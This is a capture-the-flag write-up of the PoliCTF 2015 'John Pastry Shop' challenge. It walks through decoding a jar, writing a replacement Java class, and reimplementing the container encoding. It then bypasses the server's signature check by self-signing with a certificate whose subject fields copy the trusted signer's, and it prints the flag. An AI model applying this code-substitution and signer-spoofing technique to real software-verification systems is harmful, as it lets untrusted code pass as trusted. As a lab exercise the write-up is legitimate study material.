Title: PoliCTF 2015 – John Pastry Shop – Pwnable 100 (aka how to make a pwndcake)
Date: 2015-07-12 13:18
Category: Old Posts
Tags: old
Slug: PoliCTF-2015-John-Pastry-Shop-Pwnable-100
Authors: wumb0

This challenge was a pain in the ass, but it was still fun. It's funny that I really don't like java but I ended up solving the two java-based challenges in this CTF. Bleh. So this challenge had a set of files and a server to connect to. The files were Cake.java, Decode.java, and ShamanoCakeContainerEncoded.jar. The server was pastry.polictf.it 80. The description was
<blockquote>Among his hobbies, John likes baking cakes to eat during the warm afternoons in Milan. He is damn good at this such that, a couple of months ago, he decided to open a pastry shop on his own. The shop was an immediate success and John needed to bake just so many cakes that he decided to outsource the production of his famous NewYorkCheeseCake to another external and trusted pastry shop, the Shamano's (see shamanoPastryShop.pem). John provided Shamano's with the original basic recipe of his Cake (see Cake.java) and, after his customization, Shamano returns to John a cake container holding the NewYorkCheeseCake (see ShamanoCakeContainerEncoded.jar). Notice that Shamano has to follow John's directions carefully and that is why he always have to encode properly his cake containers so that John can verify all of them accordingly to a fixed decoding process (see extract of source code in Decode.java). John always tries his best for verifying the quality and genuineness of the incoming NewYorkCheeseCake but, you know, to busy people, like he is, it may sometimes happen to forget to check something.</blockquote>
So there is a Cake, a NewYorkCheeseCake, and a Decoder, that must be the three files. First, I wanted to see what the server would do upon sending it the ShamanoCakeContainerEncoded.jar file.
```bash
nc pastry.polictf.it 80 < ShamanoCakeContainerEncoded.jar
Welcome to John's Pastry Shop!
In John's opinion this cake container seems a trusted one from Shamano's Pastry Shop.
And it also contains a valid NewYorkCheeseCake.
This seems a tasty cake!
Here are its ingredients:
* Cream Cheese
* Biscuits
* Sugar
* Isinglass
Thanks for visiting John's Pastry Shop!
```
Since it said something about encoding I wanted to make sure it was a jarfile.
```shell
file ShamanoCakeContainerEncoded.jar
ShamanoCakeContainerEncoded.jar: data
```
Alright so it's encoded like it says, the file command should say it is a zip file since jars are just zips. Good thing there is a Decoder! ... well, most of a decoder:
[[more]]
```java
// ..Extract from the decoding system..
// These are the special bytes for the encoding/decoding.
private static final byte INIT\_BYTE = (byte) 0x17;
private static final byte ESCAPE\_BYTE = (byte) 0x18;
private static final byte EXIT\_BYTE = (byte) 0x19;
// These are helper flags.
private static boolean isValidData = false;
private static boolean isEscapingMode = false;
private static boolean isSequenceClosed = false;
// Decoder behavior for the input cake containers:
// ouputStream holds a FileOutputStream, which writes the 
// decoded version of the file..
int read;
while ((read = System.in.read()) != -1 && !isSequenceClosed) {
	if ((byte) read == INIT_BYTE && !isEscapingMode)
		isValidData = true;
        else {
        	if ((byte) read == EXIT_BYTE && !isEscapingMode) {
			isValidData = false;
                        isSequenceClosed = true;
                }
                else {
                	if (!isEscapingMode && (byte) read == ESCAPE_BYTE)
                		isEscapingMode = true;
                        else {
                        	if (isEscapingMode && !isValidData)
                                	isEscapingMode = false;
                            	else {
                                	if (isValidData) {
                                		isEscapingMode = false;
                                		outputStream.write((byte) read);
                                	}
                            	}
                        }
                    }
                }
        }
}
```

This is not a complete java class. So I fixed it. Note the marked lines above, they are important to the solution.
```java
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
public class Decode {
    private static final byte INIT\_BYTE = (byte) 0x17;
    private static final byte ESCAPE\_BYTE = (byte) 0x18;
    private static final byte EXIT\_BYTE = (byte) 0x19;
    private static boolean isValidData = false;
    private static boolean isEscapingMode = false;
    private static boolean isSequenceClosed = false;
    public static void main(String args[]){
        int read;
        try {
            File file = new File("decoded.jar");
            FileOutputStream outputStream = new FileOutputStream(file);
            while ((read = System.in.read()) != -1 && !isSequenceClosed) {
                if ((byte) read == INIT_BYTE && !isEscapingMode)
                        isValidData = true;
                else {
                    if ((byte) read == EXIT_BYTE && !isEscapingMode) {
                        isValidData = false;
                        isSequenceClosed = true;
                    }
                    else {
                        if (!isEscapingMode && (byte) read == ESCAPE_BYTE)
                                isEscapingMode = true;
                        else {
                            if (isEscapingMode && !isValidData)
                                isEscapingMode = false;
                            else {
                                if (isValidData) {
                                    isEscapingMode = false;
                                    outputStream.write((byte) read);
                                }
                            }
                        }
                    }
                }
            }
        } catch (IOException e){
            e.printStackTrace();
        }
    }
}
```
This takes input from stdin and writes the decoded jar to a file called decoded.jar (I do the javas sometimes I guess...). Then, I attempted to decode the ShamanoCakeContainerEncoded.jar file.
```shell
javac Decode.java
java Decode < ShamanoCakeContainerEncoded.jar
file decoded.jar
decoded.jar: Zip archive data, at least v2.0 to extract
```
Bingo. It's now a readable jar file. I opened it up in JD-GUI to take a look at the code. 
<div><a href="/images/old/uploads/2015/07/Screen-Shot-2015-07-11-at-11.46.48-PM.png"><img src="/images/old/uploads/2015/07/Screen-Shot-2015-07-11-at-11.46.48-PM.png" alt="File Structure" width="265" height="169" class="uk-align-center" /></a></div>
Only one class file, NewYorkCheeseCake, and signing stuff (META-INF). The NewYorkCheeseCake code was simple.
```java
package it.polimi.necst.johncakedesigner;
import java.util.List;
public class NewYorkCheeseCake
  extends Cake
{
  public void addIngredientsToCake()
  {
    this.ingredientsList.add("Cream Cheese");
    this.ingredientsList.add("Biscuits");
    this.ingredientsList.add("Sugar");
    this.ingredientsList.add("Isinglass");
  }
}
```
I needed to write my own NewYorkCheeseCake class to find the flag. I then looked at the Cake.java class to see what was being extended.
```java
public abstract class Cake {
    protected boolean shouldBeAddedTheSpecialIngredient;
    protected List<String> ingredientsList;
    // Zero constructor
    protected Cake() {
        shouldBeAddedTheSpecialIngredient = false;
        ingredientsList = new LinkedList<>();
    }
    // To be implemented in the classes that extends this one.
    // by filling up the ingredientsList with all the ingredients
    // of the extending Cake.
    public abstract void addIngredientsToCake();
    public @NotNull List<String> getIngredients() {
        return ingredientsList;
    }
}
```
The <em>shouldBeAddedTheSpecialIngredient</em> attribute looks promising. Admittedly it took me so long to find this because I wrote the class to exec commands on the machine that was hosting the challenge first before actually looking closer at this file. From here I constructed my custom NewYorkCheeseCake (aka pwndcake).
```java
package it.polimi.necst.johncakedesigner;
import java.util.List;
public class NewYorkCheeseCake extends Cake{
    public void addIngredientsToCake(){
        this.shouldBeAddedTheSpecialIngredient = true;
    }
}
```
I went to build my pwndcake
```shell
javac Cake.java NewYorkCheeseCake.java
Cake.java:21: illegal start of type
        ingredientsList = new LinkedList<>();
```
Looks like an error. Since strings are being added to that list in the original NewYorkCheeseCake class I just put string in between the angle brackets and tried to compile again.
```
javac Cake.java NewYorkCheeseCake.java
ingredientsList = new LinkedList<String>();
Cake.java:3: package com.sun.istack.internal does not exist
import com.sun.istack.internal.NotNull;
                              ^
Cake.java:29: cannot find symbol
symbol  : class NotNull
location: class it.polimi.necst.johncakedesigner.Cake
    public @NotNull List<String> getIngredients() {
            ^
2 errors
```
I just removed the import line and the @NotNull decorator and tried to compile again. This time it worked. Then I needed to pack it into a jar file.
```shell
mkdir -p it/polimi/necst/johncakedesigner && cp NewYorkCheeseCake.class $\_
jar -cfe pwndcake.jar it.polimi.necst.johncakedesigner.NewYorkCheeseCake it
```

It took me a while to figure out how to do this right. The path needs to be it/polimi/necst/johncakedesigner because of the package name it.polimi.necst.johncakedesigner. I sent the jar.
```
nc pastry.polictf.it 80 < pwndcake.jar
Welcome to John's Pastry Shop!
[Error] zip file is empty Exit now..
```
No luck, it thinks the jar is empty since it isn't encoded like it should be. I took a closer look at the decoding algorithm and wrote an encoder. Essentially the decoder expects an INIT\_BYTE (0x17) at the beginning of the file, an EXIT\_BYTE (0x19) at the end of the file, and any occurances of INIT\_BYTE or EXIT\_BYTE in the middle of the file with ESCAPE\_BYTE (0x18). ESCAPE\_BYTEs that are not escaping other bytes are also escaped with an ESCAPE\_BYTE (like \\\\ in the shell). From this knowledge I wrote an encoder to take a normal jar file from stdin, encode it, and write the encoded bytes to the file encoded.jar.
```java
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
public class Encode {
    private static final byte INIT_BYTE = (byte) 0x17;
    private static final byte ESCAPE_BYTE = (byte) 0x18;
    private static final byte EXIT_BYTE = (byte) 0x19;
    public static void main(String args[]){
        int read;
        try {
            File file = new File("encoded.jar");
            FileOutputStream outputStream = new FileOutputStream(file);
            outputStream.write((byte) INIT_BYTE);
            while ((read = System.in.read()) != -1) {
                if ((byte) read == INIT_BYTE || (byte)read == EXIT_BYTE\|| (byte)read == ESCAPE_BYTE){
                    outputStream.write((byte) ESCAPE_BYTE);
                }
                outputStream.write((byte) read);
            }
            outputStream.write((byte) EXIT_BYTE);
        } catch (IOException e){
            e.printStackTrace();
        }
    }
}
```
To make sure my encoder worked I compiled it, ran it on the decoded.jar file that was created earlier by the Decode class, and diffed the resulting encoded.jar with the provided ShamanoCakeContainerEncoded.jar file. 
```
javac Encode.java
java Encode < decoded.jar
diff encoded.jar ShamanoCakeContainerEncoded.jar
```
No output meant no difference! It seems like it worked. I sent the encoded.jar file to the server to make sure and it worked. I sent the pwndcake.jar file hoping for a flag back, but there was one more obstacle to overcome.
```
java Encode < pwndcake.jar
nc pastry.polictf.it 80 < encoded.jar
Welcome to John's Pastry Shop!
[Error] The cake container has unsigned class files. Exit now..
```
Signing a jar can be confusing. You have to generate a keystore with keytool and then sign it with jarsigner. I thought that just signing it would be enough.
```
keytool -genkey -alias poli
Enter keystore password:  
What is your first and last name?
  [Unknown]:  
What is the name of your organizational unit?
  [Unknown]:  
What is the name of your organization?
  [Unknown]:  
What is the name of your City or Locality?
  [Unknown]:  
What is the name of your State or Province?
  [Unknown]:  
What is the two-letter country code for this unit?
  [Unknown]:  
Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?
  [no]:  yes
Enter key password for <poli>
        (RETURN if same as keystore password):  
jarsigner pwndcake.jar poli
java Encode < pwndcake.jar
nc pastry.polictf.it 80 < encoded.jar
Welcome to John's Pastry Shop!
[Error] The cake container was not signed by the expected Shamano baker. Exit now..
```
Okay, so I need to make sure it's signed correctly. I didn't have the Shamano baker's private keystore for signing so I went to inspecting the jarfile with jarsigner
```
jarsigner -verify -verbose -certs decoded.jar
         177 Wed Apr 15 18:28:26 EDT 2015 META-INF/MANIFEST.MF
         298 Wed Apr 15 18:28:26 EDT 2015 META-INF/SHAMANO_.SF
        1441 Wed Apr 15 18:28:26 EDT 2015 META-INF/SHAMANO_.RSA
sm       676 Wed Apr 15 18:26:50 EDT 2015 it/polimi/necst/johncakedesigner/NewYorkCheeseCake.class
      X.509, CN=Shamano Pastry Shop, OU=Shamano Cooking Service, O=Shamano Inc., L=Milano, ST=Italy, C=IT
      [certificate is valid from 4/15/15 8:31 AM to 8/31/42 8:31 AM]
  s = signature was verified 
  m = entry is listed in manifest
  k = at least one certificate was found in keystore
  i = at least one certificate was found in identity scope
jar verified.
```
I created a new keystore with the same CN, OU, O, L, ST, and C values as the original jar, encoded it, and sent it.
```
keytool -genkey -alias poli2
Enter keystore password:
What is your first and last name?
  [Unknown]:  Shamano Pastry Shop
What is the name of your organizational unit?
  [Unknown]:  Shamano Cooking Service
What is the name of your organization?
  [Unknown]:  Shamano Inc.
What is the name of your City or Locality?
  [Unknown]:  Milano
What is the name of your State or Province?
  [Unknown]:  Italy
What is the two-letter country code for this unit?
  [Unknown]:  IT
Is CN=Shamano Pastry Shop, OU=Shamano Cooking Service, O=Shamano Inc., L=Milano, ST=Italy, C=IT correct?
  [no]:  yes
Enter key password for <poli2>
        (RETURN if same as keystore password): 
jarsigner pwndcake.jar poli2
java Encode < pwndcake.jar
nc pastry.polictf.it 80 < encoded.jar
Welcome to John's Pastry Shop!
In John's opinion this cake container seems a trusted one from Shamano's Pastry Shop.
And it also contains a valid NewYorkCheeseCake.
This seems a tasty cake!
Here are its ingredients:
flag{PinzimonioIsTheSecretIngredientAndANiceFlag}
Thanks for visiting John's Pastry Shop!
```
Looks like a flag to me: <strong>flag{PinzimonioIsTheSecretIngredientAndANiceFlag}</strong>
